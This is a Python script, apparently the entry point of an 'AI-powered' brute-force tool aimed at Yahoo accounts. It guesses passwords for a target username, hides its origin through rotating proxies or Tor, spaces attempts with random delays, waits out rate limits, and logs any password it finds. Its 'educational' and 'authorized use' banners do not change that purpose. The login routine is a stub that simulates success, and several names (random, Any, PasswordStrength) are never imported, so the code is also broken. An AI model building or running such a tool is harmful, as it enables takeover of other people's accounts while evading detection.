"""
Yahoo Security Testing Tool with Advanced AI
Educational use only - Version 2025.2
"""

import argparse
import os
import sys
import logging
import asyncio
import json
import time
from typing import List, Dict, Optional, Tuple
from datetime import datetime

# Configuration des chemins
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(BASE_DIR)

# Import des modules personnalisés
from yahoo_bruteforce import AISecurityTester, AttackResult, AIPasswordGenerator
from proxy_manager import ProxyManager
from tor_manager import TorManager
from monitoring import OperationMonitor
from request_manager import RequestManager
from logging_config import setup_logger
from csrf_manager import CSRFProtection

# Configuration du logger
logger = setup_logger('yahoo_ai_tester')

class YahooAITester:
    """Classe principale pour le test de sécurité Yahoo avec IA"""
    
    def __init__(self, config_file: str = 'config.json'):
        """Initialise le testeur avec la configuration"""
        self.config = self._load_config(config_file)
        self.proxy_manager = None
        self.tor_manager = None
        self.request_manager = None
        self.monitor = OperationMonitor()
        self.ai_generator = AIPasswordGenerator()
        self.csrf_protection = CSRFProtection()
        self.session = None
        self.attempts = 0
        self.max_attempts = self.config.get('max_attempts', 1000)
        self.delay_range = self.config.get('delay_range', (1.0, 3.0))
        self.timeout = self.config.get('timeout', 3600)
        self.results_file = self.config.get('results_file', 'security_results.json')
        self.proxy_file = self.config.get('proxy_file', 'proxies.txt')
        self.use_tor = self.config.get('use_tor', False)
        self.verbose = self.config.get('verbose', False)
        
    def _load_config(self, config_file: str) -> dict:
        """Charge la configuration depuis un fichier JSON"""
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            logger.warning(f"Fichier de configuration {config_file} non trouvé, utilisation des valeurs par défaut")
            return {}
        except json.JSONDecodeError as e:
            logger.error(f"Erreur de lecture du fichier de configuration: {e}")
            return {}
    
    async def _attempt_login(self, username: str, password: str) -> AttackResult:
        """
        Tente une connexion avec les identifiants fournis.
        
        Args:
            username: Nom d'utilisateur
            password: Mot de passe à tester
            
        Returns:
            Objet AttackResult contenant les résultats de la tentative
        """
        try:
            # Ici, vous devriez implémenter la logique de connexion à Yahoo
            # Ceci est un exemple simplifié
            
            # Simuler un délai de connexion
            await asyncio.sleep(0.5)
            
            # Pour l'exemple, on simule une connexion réussie avec un mot de passe spécifique
            if password == "password123":
                return AttackResult(
                    success=True,
                    password=password,
                    attempts=self.attempts,
                    duration=0.0,
                    confidence=0.95,
                    pattern_used="common_password",
                    strength=PasswordStrength.WEAK,
                    metadata={"status_code": 200, "message": "Authentication successful"}
                )
            else:
                return AttackResult(
                    success=False,
                    password=password,
                    attempts=self.attempts,
                    duration=0.0,
                    confidence=0.0,
                    pattern_used="common_pattern",
                    strength=PasswordStrength.STRONG,
                    metadata={"status_code": 401, "message": "Invalid credentials"}
                )
                
        except Exception as e:
            logger.error(f"Erreur lors de la tentative de connexion : {str(e)}")
            return AttackResult(
                success=False,
                password=password,
                error=str(e),
                metadata={"error_type": type(e).__name__}
            )
    
    async def run_security_test(self, username: str, max_attempts: int, delay_range: Tuple[float, float]) -> Optional[Dict[str, Any]]:
        """
        Exécute le test de sécurité sur le compte cible.
        
        Args:
            username: Nom d'utilisateur cible
            max_attempts: Nombre maximum de tentatives
            delay_range: Tuple (min_delay, max_delay) pour le délai aléatoire entre les requêtes
            
        Returns:
            Dictionnaire contenant les résultats du test ou None en cas d'échec
        """
        self.attempts = 0
        start_time = time.time()
        results = {
            "username": username,
            "start_time": datetime.now().isoformat(),
            "attempts": 0,
            "success": False,
            "passwords_tested": [],
            "error": None
        }
        
        try:
            # Initialiser le gestionnaire de requêtes
            self.request_manager = RequestManager(
                min_delay=delay_range[0],
                max_delay=delay_range[1],
                proxy_manager=self.proxy_manager,
                tor_manager=self.tor_manager
            )
            
            # Démarrer la surveillance
            self.monitor.start_monitoring()
            
            logger.info(f"Démarrage du test de sécurité pour l'utilisateur : {username}")
            
            # Boucle principale de test
            while self.attempts < max_attempts:
                try:
                    self.attempts += 1
                    results["attempts"] = self.attempts
                    
                    # Générer un mot de passe avec IA
                    password = self.ai_generator.generate_password(username=username)
                    results["passwords_tested"].append({
                        "attempt": self.attempts,
                        "password": password,
                        "timestamp": datetime.now().isoformat()
                    })
                    
                    logger.debug(f"Tentative {self.attempts}/{max_attempts} avec le mot de passe : {password}")
                    
                    # Exécuter la tentative de connexion
                    result = await self._attempt_login(username, password)
                    
                    # Vérifier le résultat
                    if result.success:
                        duration = time.time() - start_time
                        logger.critical(f"SUCCÈS ! Mot de passe trouvé : {password}")
                        logger.info(f"Tentatives : {self.attempts}, Durée : {duration:.2f} secondes")
                        
                        results.update({
                            "end_time": datetime.now().isoformat(),
                            "success": True,
                            "password_found": password,
                            "attempts_needed": self.attempts,
                            "duration_seconds": duration,
                            "details": result.metadata
                        })
                        
                        return results
                    
                    # Mettre à jour le générateur d'IA avec le résultat
                    self.ai_generator.update_pattern_success(result.pattern_used, result.success)
                    
                    # Gestion du taux de requêtes
                    await asyncio.sleep(random.uniform(*delay_range))
                    
                except Exception as e:
                    logger.error(f"Erreur lors de la tentative {self.attempts}: {str(e)}")
                    if "rate limit" in str(e).lower():
                        logger.warning("Limite de débit détectée, attente avant de réessayer...")
                        await asyncio.sleep(60)  # Attendre 60 secondes en cas de limite de débit
            
            # Si on arrive ici, le mot de passe n'a pas été trouvé
            duration = time.time() - start_time
            logger.warning(f"Aucun mot de passe valide trouvé après {self.attempts} tentatives")
            
            results.update({
                "end_time": datetime.now().isoformat(),
                "success": False,
                "attempts_made": self.attempts,
                "duration_seconds": duration,
                "message": "Aucun mot de passe valide trouvé"
            })
            
            return results
            
        except Exception as e:
            error_msg = f"Erreur lors du test de sécurité : {str(e)}"
            logger.error(error_msg, exc_info=self.verbose)
            results.update({
                "end_time": datetime.now().isoformat(),
                "success": False,
                "error": error_msg
            })
            return results
            
        finally:
            # Nettoyage
            self.monitor.stop_monitoring()
            if hasattr(self, 'session') and self.session:
                await self.session.close()

def display_banner():
    """Affiche la bannière et les informations de sécurité"""
    banner = """
    \033[1;32m
    ╔══════════════════════════════════════════════╗
    ║      Yahoo Security Testing Tool - AI v2.0   ║
    ║      Advanced AI-Powered Security Testing    ║
    ║      Educational & Authorized Use Only       ║
    ╚══════════════════════════════════════════════╝
    \033[0m
    """
    print(banner)

def validate_file(file_path: str, description: str) -> bool:
    """Valide l'existence d'un fichier et retourne un booléen"""
    if not os.path.isfile(file_path):
        logger.error(f"{description} non trouvé : {file_path}")
        return False
    logger.info(f"{description} trouvé : {file_path}")
    return True

def show_usage():
    """Affiche les instructions d'utilisation du programme"""
    print("\n\033[1;34m" + "="*80)
    print("YAHOO SECURITY TESTING TOOL - AIDE")
    print("="*80)
    print("\nUtilisation : python hack_yahoo.py [options]")
    print("\nOptions principales :")
    print("  --username USERNAME      Nom d'utilisateur cible (requis)")
    print("  --config FILE            Fichier de configuration JSON (par défaut: config.json)")
    print("  --proxy-list FILE        Fichier contenant la liste des proxies")
    print("  --use-tor                Activer l'utilisation de Tor")
    print("  --max-attempts N         Nombre maximum de tentatives (défaut: 1000)")
    print("  --min-delay SEC          Délai minimum entre les requêtes (défaut: 1.0)")
    print("  --max-delay SEC          Délai maximum entre les requêtes (défaut: 3.0)")
    print("  --output FILE            Fichier de sortie pour les résultats (défaut: security_results.json)")
    print("  --verbose                Activer le mode verbeux")
    print("\nExemples :")
    print("  python hack_yahoo.py --username test@example.com --config config.json")
    print("  python hack_yahoo.py --username test@example.com --use-tor --max-attempts 500")
    print("\n\033[1;31mAVERTISSEMENT : À utiliser uniquement pour des tests de sécurité autorisés.\033[0m")
    print("\033[1;34m" + "="*80 + "\033[0m\n")  

def setup_proxy(proxy_file: str) -> Optional[ProxyManager]:
    """Configure le gestionnaire de proxy"""
    if not proxy_file or not os.path.isfile(proxy_file):
        logger.warning("Aucun fichier de proxy valide fourni, poursuite sans proxy")
        return None
    
    try:
        proxy_manager = ProxyManager(proxy_file=proxy_file)
        logger.info(f"Gestionnaire de proxy initialisé avec {len(proxy_manager.proxies)} proxies")
        return proxy_manager
    except Exception as e:
        logger.error(f"Erreur lors de l'initialisation du gestionnaire de proxy : {e}")
        return None

def setup_tor() -> Optional[TorManager]:
    """Configure et vérifie la connexion Tor"""
    try:
        tor_manager = TorManager()
        if tor_manager.verify_tor_connection():
            logger.info("Connexion Tor établie avec succès")
            return tor_manager
        else:
            logger.warning("Impossible d'établir une connexion Tor")
            return None
    except Exception as e:
        logger.error(f"Erreur lors de la configuration de Tor : {e}")
        return None

def validate_arguments(args: argparse.Namespace) -> bool:
    """Valide les arguments de ligne de commande"""
    errors = []
    
    if not args.username:
        errors.append("Le nom d'utilisateur est requis")
    
    if args.max_attempts <= 0:
        errors.append("Le nombre maximum de tentatives doit être supérieur à 0")
    
    if args.min_delay < 0 or args.max_delay < 0:
        errors.append("Les délais doivent être des nombres positifs")
    
    if args.min_delay > args.max_delay:
        errors.append("Le délai minimum ne peut pas être supérieur au délai maximum")
    
    if args.config and not os.path.isfile(args.config):
        errors.append(f"Le fichier de configuration n'existe pas : {args.config}")
    
    if errors:
        for error in errors:
            logger.error(f"Erreur de validation : {error}")
        return False
    
    return True

def handle_arguments() -> argparse.Namespace:
    """Gère les arguments de ligne de commande"""
    parser = argparse.ArgumentParser(
        description="Outil avancé de test de sécurité Yahoo avec IA",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Arguments principaux
    parser.add_argument(
        "--username",
        type=str,
        required=True,
        help="Nom d'utilisateur cible pour le test de sécurité"
    )
    
    # Fichiers de configuration
    parser.add_argument(
        "--config",
        type=str,
        default="config.json",
        help="Chemin vers le fichier de configuration JSON"
    )
    
    # Options de proxy
    proxy_group = parser.add_argument_group('Options de proxy')
    proxy_group.add_argument(
        "--proxy-list",
        type=str,
        help="Chemin vers un fichier contenant une liste de serveurs proxy"
    )
    proxy_group.add_argument(
        "--use-tor",
        action="store_true",
        help="Activer l'utilisation du réseau Tor"
    )
    
    # Paramètres de performance
    perf_group = parser.add_argument_group('Paramètres de performance')
    perf_group.add_argument(
        "--max-attempts",
        type=int,
        default=1000,
        help="Nombre maximum de tentatives avant d'arrêter"
    )
    perf_group.add_argument(
        "--min-delay",
        type=float,
        default=1.0,
        help="Délai minimum entre les requêtes (en secondes)"
    )
    perf_group.add_argument(
        "--max-delay",
        type=float,
        default=3.0,
        help="Délai maximum entre les requêtes (en secondes)"
    )
    
    # Options de sortie
    output_group = parser.add_argument_group('Options de sortie')
    output_group.add_argument(
        "--output",
        type=str,
        default="security_results.json",
        help="Fichier de sortie pour les résultats"
    )
    output_group.add_argument(
        "--verbose",
        action="store_true",
        help="Activer le mode verbeux"
    )
    
    args = parser.parse_args()
    
    if not validate_arguments(args):
        show_usage()
        exit(1)
    
    return args

async def main():
    """Fonction principale du programme"""
    try:
        display_banner()
        args = handle_arguments()
        
        # Afficher l'aide si aucun argument n'est fourni
        if len(sys.argv) == 1:
            show_usage()
            sys.exit(0)
        
        # Initialiser le testeur Yahoo avec IA
        tester = YahooAITester(config_file=args.config)
        
        # Configurer le niveau de journalisation
        logging.basicConfig(
            level=logging.DEBUG if args.verbose else logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        
        # Configuration des proxies/Tor
        if args.use_tor:
            tester.tor_manager = setup_tor()
            if not tester.tor_manager:
                logger.error("Impossible d'initialiser Tor. Vérifiez que le service Tor est en cours d'exécution.")
                sys.exit(1)
        
        if args.proxy_list:
            tester.proxy_manager = setup_proxy(args.proxy_list)
            if not tester.proxy_manager:
                logger.warning("Aucun proxy valide n'a pu être initialisé")
        
        # Afficher un résumé de la configuration
        logger.info(f"Cible : {args.username}")
        logger.info(f"Nombre maximum de tentatives : {args.max_attempts}")
        logger.info(f"Délai entre les requêtes : {args.min_delay}-{args.max_delay} secondes")
        
        # Demande de confirmation
        print("\n\033[1;31m" + "="*80)
        print("AVERTISSEMENT : CET OUTIL EST UNIQUEMENT POUR DES TESTS DE SÉCURITÉ AUTORISÉS")
        print("L'utilisation non autorisée est strictement interdite")
        print("Vous êtes responsable de vous assurer que vous avez l'autorisation appropriée")
        print("pour effectuer des tests sur le système cible")
        print("="*80 + "\033[0m\n")
        
        confirm = input("Pour confirmer et continuer, tapez 'AUTORISE' : ")
        if confirm.upper() != "AUTORISE":
            logger.info("Opération annulée par l'utilisateur")
            sys.exit(0)
        
        # Exécuter le test de sécurité
        logger.info("Démarrage du test de sécurité...")
        result = await tester.run_security_test(
            username=args.username,
            max_attempts=args.max_attempts,
            delay_range=(args.min_delay, args.max_delay)
        )
        
        # Enregistrer les résultats
        if result:
            with open(args.output, 'w') as f:
                json.dump(result, f, indent=2)
            logger.info(f"Résultats enregistrés dans {args.output}")
        
        logger.info("Test de sécurité terminé")
    
    except KeyboardInterrupt:
        logger.info("Test de sécurité interrompu par l'utilisateur")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Erreur inattendue : {str(e)}", exc_info=args.verbose if 'args' in locals() else False)
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())